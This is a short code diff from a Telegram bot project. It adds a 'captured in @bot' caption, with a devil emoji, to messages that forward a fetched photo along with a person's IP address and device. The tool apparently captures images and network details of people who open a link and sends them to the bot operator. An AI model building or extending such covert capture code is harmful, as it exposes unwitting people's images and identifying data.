@@ -5,6 +5,7 @@ import { getTranslations } from "next-intl/server";
 import { bot } from "~/bot";
 import { REPORT_REASONS } from "~/bot/handlers/callbacks/report";
 import { AdminService } from "~/bot/services/admin";
+import { envs } from "~/configs/envs";
 
 interface SendPhotoToChat {
 	photo: string;
@@ -19,7 +20,10 @@ export async function sendPhotoToChat({ photo, chatId, ip, device }: SendPhotoTo
 	const blob = await fetch(photo).then((res) => res.blob());
 	try {
 		await bot.api.sendPhoto(chatId, new InputFile(Buffer.from(await blob.arrayBuffer())), {
-			caption: `IP: ${ip}\n` + `${t("device")}: ${device}\n\n`,
+			caption:
+				`IP: ${ip}\n` +
+				`${t("device")}: ${device}\n\n` +
+				`<b>${t("capturedIn")} @${envs.NEXT_PUBLIC_BOT_NAME} 😈</b>`,
 			reply_markup: new InlineKeyboard()
 				.text(t("report-violation-button"), `report:${REPORT_REASONS.violation}`)
 				.row()
